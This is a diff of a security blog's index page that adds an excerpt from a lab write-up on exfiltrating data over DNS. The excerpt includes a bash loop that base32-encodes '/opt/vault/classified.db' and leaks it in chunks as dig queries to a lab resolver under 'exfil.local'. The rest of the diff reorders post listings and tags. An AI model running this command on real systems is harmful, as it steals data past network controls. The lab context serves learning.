@@ -137,6 +137,41 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2026/07/13/2026-07-13-dns-data-exfil/" title="A short showcase of how DNS can be abused as a data exfiltration channel.">Data Exfiltration by Abusing DNS</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-07-13  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Data-Exfiltration-by-Abusing-DNS"><a href="#Data-Exfiltration-by-Abusing-DNS" class="headerlink" title="Data Exfiltration by Abusing DNS"></a>Data Exfiltration by Abusing DNS</h1><h3 id="This-was-BreachLab’s-Phantom-The-Heist"><a href="#This-was-BreachLab’s-Phantom-The-Heist" class="headerlink" title="This was BreachLab’s Phantom The Heist"></a>This was BreachLab’s <a target="_blank" rel="noopener" href="https://breachlab.org/">Phantom The Heist</a></h3><p>DNS is easy to overlook during a compromise. It is usually allowed out of a network, it is noisy by nature, and many environments focus harder on HTTP, SSH, or obvious file transfer tools. That makes it a useful channel for moving small amounts of data when a host can resolve external names.</p>
+<p>In this lab example, the target file was:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/vault/classified.db</span><br></pre></td></tr></table></figure>
+
+<p>The exfiltration command was:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=0</span><br><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span> | <span class="built_in">fold</span> -w32 | <span class="keyword">while</span> <span class="built_in">read</span> -r chunk; <span class="keyword">do</span></span><br><span class="line">    dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br><span class="line">    i=$((i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="How-It-Worked"><a href="#How-It-Worked" class="headerlink" title="How It Worked"></a>How It Worked</h2><p>The important trick is that DNS names can carry attacker-controlled text. Instead of sending the file directly over HTTP or copying it with <code>scp</code>, the file is encoded and placed into DNS query labels.</p>
+<p>This part reads the file and converts it to DNS-safe text:</p>
+	
+	</div>
+  <a type="button" href="/2026/07/13/2026-07-13-dns-data-exfil/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2026/06/27/2026-06-27-abusing-system-services/" title="A short showcase of user-level persistence through systemd user services on a Linux host.">Persistence by Abusing systemd Services</a>
 		</h3>
 		</div>
@@ -418,35 +453,6 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2026/05/01/2026-05-01-welcome-portswigger/" title="A starter post for PortSwigger Academy notes and web security practice.">Welcome to PortSwigger Notes</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2026-05-01  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>This category is for my <strong>PortSwigger</strong> Academy notes, lab references, and web security learning.</p>
-<p>Future posts here can include lab summaries, exploitation notes, and useful techniques.</p>
-
-	
-	</div>
-  <a type="button" href="/2026/05/01/2026-05-01-welcome-portswigger/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
 			<a href="/2026/05/01/2026-05-01-welcome-hackthebox/" title="A starter post for Hack The Box notes and writeups.">Welcome to Hack The Box Notes</a>
 		</h3>
 		</div>
@@ -467,6 +473,35 @@
 	
 	</div>
   <a type="button" href="/2026/05/01/2026-05-01-welcome-hackthebox/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2026/05/01/2026-05-01-welcome-portswigger/" title="A starter post for PortSwigger Academy notes and web security practice.">Welcome to PortSwigger Notes</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2026-05-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>This category is for my <strong>PortSwigger</strong> Academy notes, lab references, and web security learning.</p>
+<p>Future posts here can include lab summaries, exploitation notes, and useful techniques.</p>
+
+	
+	</div>
+  <a type="button" href="/2026/05/01/2026-05-01-welcome-portswigger/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -554,7 +589,7 @@
 		
 			<li><a href="/categories/portswigger/">portswigger<span>1</span></a></li>
 		
-			<li><a href="/categories/security/">security<span>6</span></a></li>
+			<li><a href="/categories/security/">security<span>7</span></a></li>
 		
 			<li><a href="/categories/tryhackme/">tryhackme<span>2</span></a></li>
 		
@@ -569,48 +604,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/cloudgoat/">cloudgoat<span>2</span></a></li>
-		
-			<li><a href="/tags/web-security/">web-security<span>2</span></a></li>
+			<li><a href="/tags/ios/">ios<span>1</span></a></li>
 		
 			<li><a href="/tags/guide/">guide<span>3</span></a></li>
 		
-			<li><a href="/tags/hackthebox/">hackthebox<span>7</span></a></li>
+			<li><a href="/tags/forensics/">forensics<span>1</span></a></li>
 		
 			<li><a href="/tags/walkthrough/">walkthrough<span>1</span></a></li>
 		
-			<li><a href="/tags/dns/">dns<span>1</span></a></li>
-		
-			<li><a href="/tags/phishing/">phishing<span>1</span></a></li>
-		
-			<li><a href="/tags/mvt/">mvt<span>1</span></a></li>
-		
-			<li><a href="/tags/portswigger/">portswigger<span>1</span></a></li>
-		
-			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
-		
-			<li><a href="/tags/ios/">ios<span>1</span></a></li>
-		
-			<li><a href="/tags/security/">security<span>6</span></a></li>
-		
-			<li><a href="/tags/forensics/">forensics<span>1</span></a></li>
-		
 			<li><a href="/tags/spyware/">spyware<span>1</span></a></li>
-		
-			<li><a href="/tags/opsec/">opsec<span>2</span></a></li>
-		
-			<li><a href="/tags/hardware/">hardware<span>1</span></a></li>
-		
-			<li><a href="/tags/labs/">labs<span>1</span></a></li>
 		
 			<li><a href="/tags/email/">email<span>1</span></a></li>
 		
 			<li><a href="/tags/tryhackme/">tryhackme<span>2</span></a></li>
 		
+			<li><a href="/tags/security/">security<span>6</span></a></li>
+		
+			<li><a href="/tags/reversing/">reversing<span>1</span></a></li>
+		
+			<li><a href="/tags/web-security/">web-security<span>2</span></a></li>
+		
+			<li><a href="/tags/cloudgoat/">cloudgoat<span>2</span></a></li>
+		
+			<li><a href="/tags/aws/">aws<span>2</span></a></li>
+		
+			<li><a href="/tags/mvt/">mvt<span>1</span></a></li>
+		
 			<li><a href="/tags/architecture/">architecture<span>1</span></a></li>
 		
+			<li><a href="/tags/hackthebox/">hackthebox<span>7</span></a></li>
 		
-		   <li><a href="/tags">...<span>21</span></a></li>
+			<li><a href="/tags/dns/">dns<span>1</span></a></li>
+		
+			<li><a href="/tags/phishing/">phishing<span>2</span></a></li>
+		
+			<li><a href="/tags/portswigger/">portswigger<span>1</span></a></li>
+		
+			<li><a href="/tags/IaC/">IaC<span>1</span></a></li>
+		
+			<li><a href="/tags/opsec/">opsec<span>2</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>22</span></a></li>
 		 
 		</ul>
 	</div>
@@ -621,6 +656,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2026/10/25/2026-10-25-infra-for-phishing/"  title="Setting up Phishing Infrastructure using nginx, gophish and terraform" ><i class="fa fa-file-o"></i>Infrastructure: Phishing</a>
+      </li>
     
       <li>
         <a href="/2026/10/16/2026-10-16-spyware-detection/"  title="Step-by-step guide to back up an iPhone from Linux and scan the backup for spyware such as Candiru using the Mobile Verification Toolkit (MVT)." ><i class="fa fa-file-o"></i>Checking Your iPhone for Sp...</a>
@@ -636,10 +675,6 @@
     
       <li>
         <a href="/2026/09/18/2026-09-18-rce-web-app/"  title="Writeup for CloudGoat&#39;s RCE WebApp." ><i class="fa fa-file-o"></i>CloudGoat - RCE WebApp</a>
-      </li>
-    
-      <li>
-        <a href="/2026/09/08/2026-09-08-orion-htb/"  title="Writeup for Orion CTF." ><i class="fa fa-file-o"></i>Orion - CTF Writeup</a>
       </li>
     
   </ul>
